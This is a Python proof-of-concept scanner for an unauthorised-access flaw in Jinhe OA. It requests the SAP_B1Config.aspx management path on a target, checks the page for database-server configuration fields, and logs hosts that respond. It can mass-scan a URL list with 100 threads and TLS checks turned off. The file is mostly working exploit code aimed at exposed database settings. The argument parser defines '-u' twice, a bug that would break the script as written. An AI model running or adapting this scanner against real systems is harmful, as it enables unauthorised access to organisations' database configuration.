import requests, argparse, sys, re, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                    
                 ██╗██╗███╗   ██╗██╗  ██╗███████╗     ██████╗  █████╗ 
                 ██║██║████╗  ██║██║  ██║██╔════╝    ██╔═══██╗██╔══██╗
                 ██║██║██╔██╗ ██║███████║█████╗      ██║   ██║███████║
            ██   ██║██║██║╚██╗██║██╔══██║██╔══╝      ██║   ██║██╔══██║
            ╚█████╔╝██║██║ ╚████║██║  ██║███████╗    ╚██████╔╝██║  ██║
             ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
    """
    print(test)


def poc(target):
    payload = '/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }
    try:
        res = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        if '数据库服务器名' in res.text and '保存' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('金和_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 金和OA 未授权漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()